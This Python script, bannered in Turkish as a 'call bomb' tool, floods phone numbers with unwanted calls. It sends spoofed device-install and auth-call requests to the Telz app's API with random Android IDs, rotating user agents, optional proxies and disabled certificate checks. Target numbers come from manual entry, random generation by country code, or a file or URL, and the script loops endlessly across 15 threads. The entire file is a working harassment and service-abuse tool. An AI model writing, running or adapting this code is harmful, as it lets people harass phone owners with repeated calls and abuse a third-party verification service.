# telz_luansit_v3.py
import time
import random
import string
import uuid
import json
import requests
import threading
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Style
import sys
import os
import re

init(autoreset=True)

# BANNER
print(f"""
{Fore.RED}
╔═══════════════════════════════════════════════════════════╗
║        CIHAN VIP CALL BOMBASI v3.0 – NUMARA FABRİKASI               ║
║          Dransit Baba ~Cihan          ║
║                KAOS = SONSUZ NUMARA!                      ║
╚═══════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
""")

# Ülke Kodları
ULKE_KODLARI = {
    "tr": "+90", "us": "+1", "gb": "+44", "ru": "+7", "de": "+49",
    "fr": "+33", "it": "+39", "es": "+34", "br": "+55", "in": "+91"
}

# Proxy & User-Agent
PROXIES = []
USER_AGENTS = [
    "Telz-Android/17.5.17", "Telz-Android/17.4.12", "Telz-Android/16.9.8"
]

def get_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/json"
    }

def generate_device():
    cihaz = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    uid = str(uuid.uuid4())
    ts = round(time.time() * 1000)
    return cihaz, uid, ts

# NUMARA ÜRETİCİ
def generate_numbers(prefix, count=100):
    nums = []
    base = prefix[1:]  # +90 → 90
    for _ in range(count):
        num = base + ''.join(random.choices("0123456789", k=10))
        nums.append(num)
    return nums

# DIŞ KAYNAKTAN NUMARA ÇEK
def load_numbers_from_source(source):
    nums = []
    if source.startswith("http"):
        try:
            r = requests.get(source, timeout=10)
            nums = [n.strip().replace("+", "") for n in r.text.splitlines() if n.strip().replace("+", "").isdigit()]
            print(f"{Fore.YELLOW}URL'den {len(nums)} numara yüklendi!")
        except:
            print(f"{Fore.RED}URL hatası!")
    elif os.path.exists(source):
        with open(source, "r") as f:
            nums = [n.strip().replace("+", "") for n in f.readlines() if n.strip().replace("+", "").isdigit()]
        print(f"{Fore.YELLOW}Dosyadan {len(nums)} numara yüklendi!")
    return nums

# GÖNDERİM
def send_call(phone):
    try:
        cihaz, uid, ts = generate_device()
        proxy = random.choice(PROXIES) if PROXIES else None
        proxies = {"http": proxy, "https": proxy} if proxy else None

        install_data = {
            "androidid": cihaz, "app_version": "17.5.17", "event": "install",
            "google_exists": "yes", "os": "android", "os_version": "9",
            "play_market": True, "ts": ts, "uuid": uid
        }
        auth_data = {
            "androidid": cihaz, "app_version": "17.5.17", "attempt": "0",
            "event": "auth_call", "lang": "ar", "os": "android",
            "os_version": "9", "phone": f"+{phone}", "ts": ts, "uuid": uid
        }

        headers = get_headers()

        r1 = requests.post("https://api.telz.com/app/install", data=json.dumps(install_data), headers=headers, proxies=proxies, timeout=10, verify=False)
        if not r1.ok: return phone, False, "install"

        r2 = requests.post("https://api.telz.com/app/authcall", data=json.dumps(auth_data), headers=headers, proxies=proxies, timeout=10, verify=False)
        return phone, r2.ok, "success" if r2.ok else f"auth: {r2.status_code}"

    except Exception as e:
        return phone, False, str(e)

# ANA MENÜ
def main():
    print(f"{Fore.CYAN}1. Manuel Numara Gir")
    print(f"2. Otomatik Numara Üret (+90, +1, vs.)")
    print(f"3. Dosya/URL'den Numara Yükle")
    print(f"4. HEPSİ BİRDEN! (Kaos Modu){Style.RESET_ALL}")

    secim = input(f"\n{Fore.MAGENTA}Seçimin: {Style.RESET_ALL}")

    numaralar = []

    if secim == "1":
        raw = input(f"{Fore.CYAN}Numaraları gir (+90 ile, virgülle): {Style.RESET_ALL}")
        numaralar = [n.strip().replace("+", "").replace(" ", "") for n in raw.split(",") if n.strip().replace("+", "").replace(" ", "").isdigit()]

    elif secim == "2":
        ulke = input(f"{Fore.CYAN}Ülke kodu (tr/us/gb): {Style.RESET_ALL}").lower()
        kod = ULKE_KODLARI.get(ulke, "+90")
        adet = int(input(f"{Fore.CYAN}Kaç numara üret: {Style.RESET_ALL}") or "100")
        print(f"{Fore.YELLOW}{kod} ile {adet} numara üretiliyor...")
        numaralar = generate_numbers(kod, adet)

    elif secim == "3":
        kaynak = input(f"{Fore.CYAN}Dosya yolu veya URL: {Style.RESET_ALL}")
        numaralar = load_numbers_from_source(kaynak)

    elif secim == "4":
        print(f"{Fore.RED}KAOS MODU: Manuel + Otomatik + URL!{Style.RESET_ALL}")
        # Manuel
        raw = input(f"{Fore.CYAN}Manuel numaralar: {Style.RESET_ALL}")
        nums1 = [n.strip().replace("+", "") for n in raw.split(",") if n.strip().replace("+", "").isdigit()]
        # Otomatik
        nums2 = generate_numbers("+90", 50)
        # URL
        nums3 = load_numbers_from_source("https://raw.githubusercontent.com/exeCAN/telz-numbers/main/numbers.txt")  # örnek
        numaralar = list(set(nums1 + nums2 + nums3))

    else:
        print(f"{Fore.RED}Geçersiz seçim!{Style.RESET_ALL}")
        sys.exit()

    if not numaralar:
        print(f"{Fore.RED}Numara yok!{Style.RESET_ALL}")
        sys.exit()

    print(f"\n{Fore.GREEN}TOPLAM {len(numaralar)} NUMARA YÜKLENDİ! SALDIRI BAŞLIYOR...{Style.RESET_ALL}\n")

    round_num = 1
    while True:
        print(f"{Fore.MAGENTA}=== TUR {round_num} ==={Style.RESET_ALL}")
        success = fail = 0

        with ThreadPoolExecutor(max_workers=15) as executor:
            results = executor.map(send_call, numaralar)

        for phone, ok, msg in results:
            if ok:
                print(f"{Fore.GREEN}SUCCESS +{phone} → Arama Gönderildi!")
                success += 1
            else:
                print(f"{Fore.RED}FAILED +{phone} → {msg}")
                fail += 1

        print(f"\n{Fore.CYAN}TUR {round_num} SONUÇLARI:")
        print(f"   Başarılı: {Fore.GREEN}{success}")
        print(f"   Başarısız: {Fore.RED}{fail}")
        print(f"   Toplam: {len(numaralar)}\n")

        round_num += 1
        wait = random.randint(40, 80)
        print(f"{Fore.YELLOW}{wait} saniye bekleniyor...{Style.RESET_ALL}")
        time.sleep(wait)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}KAOS DURDURULDU! @Luansit Baban emriyle...{Style.RESET_ALL}")